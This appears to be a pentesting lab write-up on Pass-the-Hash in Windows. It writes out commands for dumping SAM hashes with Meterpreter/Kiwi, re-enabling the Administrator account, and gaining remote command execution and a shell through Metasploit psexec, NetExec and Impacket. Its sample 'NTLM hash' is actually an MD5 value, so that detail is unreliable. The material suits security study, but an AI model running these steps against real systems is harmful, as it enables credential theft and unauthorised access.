# Pass-the-Hash (PtH)

## What is Pass-the-Hash?

Pass-the-Hash is an authentication technique where:

```
The NTLM Hash is used instead of the actual password.
```

Meaning:

You do not need to know:

```
The user's real password
```

You only need:

```
The NTLM Hash
```

---

# How Does It Work?

In Windows environments:

- User passwords are stored as NTLM hashes.
- During authentication, some protocols can use the hash itself.

Protocols that may support Pass-the-Hash:

- SMB
- WinRM
- PsExec
- WMI

Instead of:

```
Password = Pass123
```

The attacker uses:

```
NTLM Hash
```

and authenticates directly.

---

# Why is Pass-the-Hash Dangerous?

Because if an attacker obtains:

```
NTLM Hash
```

they may not need to:

```
Crack the password
```

at all.

The hash itself can be enough to authenticate.

---

# Sources of NTLM Hashes

Hashes can be obtained from:

- SAM Dump
- Mimikatz
- LSASS Memory
- Hashdump
- Meterpreter

---

# Example NTLM Hash

```
aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
```

The format is:

```
LM Hash : NTLM Hash
```

---

# Exploitation Using Metasploit

## PsExec Module

Use:

```text
use exploit/windows/smb/psexec
```

---

## Configure Username

```text
set SMBUser administrator
```

---

## Provide NTLM Hash

```text
set SMBPass <NTLM_HASH>
```

---

## Set Domain

```text
set SMBDomain WORKGROUP
```

---

## Select Target

```text
set target Native upload
```

---

## Run

```text
run
```

---

# Common Protocols Supporting Pass-the-Hash

| Protocol | Support |
|---|---|
| SMB | Very common |
| PsExec | Very common |
| WinRM | Supported |
| WMI | Supported |

---

# Lab

# Extracting Hashes Using Kiwi

After obtaining a Meterpreter session, we can use Kiwi to extract credentials and hashes.

---

## Step 1: Load Kiwi

Inside Meterpreter:

```text
load kiwi
```

![](../../../../../../Images/Pasted%20image%2020260516012544.png)

---

## Step 2: Extract Hashes

Use:

```text
lsa_dump_sam
```

or:

```text
hashdump
```

![](../../../../../../Images/Pasted%20image%2020260516012612.png)

---

## Step 3: Extract LM Hash

Retrieve LM hashes from the SAM database.

![](../../../../../../Images/Pasted%20image%2020260516012854.png)

---

# Using PsExec with Pass-the-Hash

Now we can use a module that supports authentication using hashes.

Load:

```text
use exploit/windows/smb/psexec
```

---

## Important Note

When using PsExec:

Change the SMB port if necessary to avoid conflicts with an existing session.

![](../../../../../../Images/Pasted%20image%2020260516013606.png)

---

## Providing the Hash

When passing the hash, provide the complete value:

```
LM Hash:NTLM Hash
```

Example:

```
aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
```

![](../../../../../../Images/Pasted%20image%2020260516013745.png)

---

# Enabling Disabled Administrator Account

The Administrator account was disabled or restricted.

We enabled it:

```cmd
net user Administrator /active:yes
```

---

## Changing the Password

```cmd
net user Administrator Pass123!
```

---

After changing the password, we retrieved the hash again and successfully authenticated.

![](../../../../../../Images/Pasted%20image%2020260516015120.png)

---

# Pass-the-Hash Using NetExec (NXC)

NetExec can also authenticate using NTLM hashes.

Example:

```bash
nxc smb TARGET -u Administrator -H NTLM_HASH
```

If the result shows:

```
Pwn3d!
```

It means:

```
The account has administrative privileges.
```

![](../../../../../../Images/Pasted%20image%2020260516015902.png)

---

# Execute Commands Using NXC

NetExec can execute commands remotely when valid hash authentication is available.

Example:

```bash
nxc smb TARGET -u Administrator -H HASH -x "command"
```

![](../../../../../../Images/Pasted%20image%2020260516020052.png)

---

# Extracting Hashes Using NXC

NetExec can also retrieve hashes if sufficient privileges are available.

![](../../../../../../Images/Pasted%20image%2020260516020332.png)

---

# Using Impacket for Full Access

If the goal is not only testing authentication but obtaining an interactive shell, use Impacket scripts.

Example:

```bash
impacket-psexec Administrator@TARGET -hashes LM:NTLM
```

![](../../../../../../Images/Pasted%20image%2020260516020725.png)

---

# Result

A full remote shell is obtained using:

```
NTLM Hash
```

without knowing the actual password.

---

# Key Takeaways

- Pass-the-Hash allows authentication using NTLM hashes instead of passwords.
- The attacker does not need to crack the password.
- Common sources of hashes:
  - SAM
  - LSASS
  - Mimikatz
  - Meterpreter
- SMB and PsExec are the most common attack paths.
- Tools supporting PtH:
  - Metasploit
  - NetExec
  - Impacket
- A stolen NTLM hash can provide the same access level as knowing the original password.